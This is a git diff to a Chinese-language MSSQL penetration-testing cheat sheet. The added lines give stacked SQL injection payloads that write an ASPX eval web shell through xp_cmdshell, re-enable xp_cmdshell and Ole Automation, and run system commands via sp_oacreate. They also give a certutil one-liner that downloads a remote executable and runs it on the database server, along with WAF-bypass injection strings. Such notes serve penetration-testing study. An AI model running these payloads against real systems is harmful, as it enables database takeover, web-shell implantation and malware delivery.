@@ -100,14 +100,34 @@ select * from xxx where id=1;insert into testtemp(dir,num,num1) execute master..
 select * from xxx where id=1;CREATE TABLE cmdtemp (dir varchar(8000));
 // 将cmd搜索结果写入表
 select * from xxx where id=1;insert into cmdtemp(dir) exec master..xp_cmdshell 'for /r c:\ %i in (lululu.jsp) do @echo %i';
+// 指定目录写文件
+select * from xxx where id=1;exec master..xp_cmdshell 'echo ^<%@ Page Language="Jscript"%^>^<%eval(Request.Item["pass"],"unsafe");%^> > c:\\lululu.aspx' ;
+```
+
+xp_cmdshell不存在的解决方法
+```
 // 如果master..xp_cmdshell未开启,用如下命令开启
 EXEC sp_configure 'show advanced options', 1;  //允许更改参数
 RECONFIGURE;
 EXEC sp_configure 'xp_cmdshell', 1;  //开启xp_cmdshell
 RECONFIGURE;
 
-// 指定目录写文件
-select * from xxx where id=1;exec master..xp_cmdshell 'echo ^<%@ Page Language="Jscript"%^>^<%eval(Request.Item["pass"],"unsafe");%^> > c:\\lululu.aspx' ;
+// 如果master..xp_cmdshell被删除，恢复sp_oacreate
+EXEC sp_configure 'show advanced options', 1;  //允许更改参数
+RECONFIGURE WITH OVERRIDE;
+EXEC sp_configure 'Ole Automation Procedures',1;
+RECONFIGURE WITH OVERRIDE;
+EXEC sp_configure 'show advanced options',0;
+RECONFIGURE WITH OVERRIDE;
+```
+
+sp_oacreate执行命令
+```
+declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c calc.exe'
+
+declare @o int
+exec sp_oacreate 'Shell.Application', @o out
+exec sp_oamethod @o, 'ShellExecute',null, 'cmd.exe','cmd /c net user >c:\test.txt','c:\windows\system32','','1';
 ```
 
 差异备份
@@ -121,11 +141,33 @@ alter database ecology set RECOVERY FULL; //先将数据库恢复模式设为完
 backup log ecology to disk='C:\Users\xxx\log.bak' with init
 ```
 
+站库分离(网站和数据库分别在不同的内网服务器上)场景下getshell
+```
+exec master.dbo.xp_cmdshell 'cd c:\Users\xxxxx & certutil -urlcache -split -f http://ip:port/file.exe'; //从远程下载恶意文件并运行，除certutil外还可用vbs、bitsadmin、powershell、ftp
+exec master.dbo.xp_cmdshell 'cd c:\Users\xxxxx & file.exe';
+```
+
+其他的一些进阶操作，参考：https://github.com/aleenzz/MSSQL_SQL_BYPASS_WIKI/blob/master/2.2.MSSQL%E6%8F%90%E6%9D%83%E4%B8%8E%E7%AB%99%E5%BA%93%E5%88%86%E7%A6%BB.md
+
 特殊符号
 ```
 注释: /* */  --
 空白符号: /**/
 加号: %2b （查询多条数据）
+```
+
+一些绕过
+```
+// 表名转换为[表名]
+select top 1 name from sysobjects -> select top 1 name from[sysobjects] 
+
+// 注释
+union select -> union/*select*/
+union select -> union/*!1*/select--*/
+
+// 注释+换行(%0a) , %20空格
+select * from xxx where id=1--/*%0aif (select IS_SRVROLEMEMBER('sysadmin'))=1 WAITFOR DELAY '0:0:5'--%20*/
+select * from xxx where id=1--/*%0aexec xp_create_subdir 'c:\text'--%20*/
 ```
 
 mssql对象类型
@@ -144,7 +186,7 @@ P = 存储过程
 PC = 程序集 (CLR) 存储过程
 PK = 主键约束（类型为 K）
 RF = 复制过滤器存储过程
-S =系统表
+S = 系统表
 SN = 同义词
 SO = 序列
 SQ = 服务队列
@@ -157,3 +199,4 @@ UQ = UNIQUE 约束（类型为 K）
 V = 视图
 X = 扩展存储过程
 ```
+
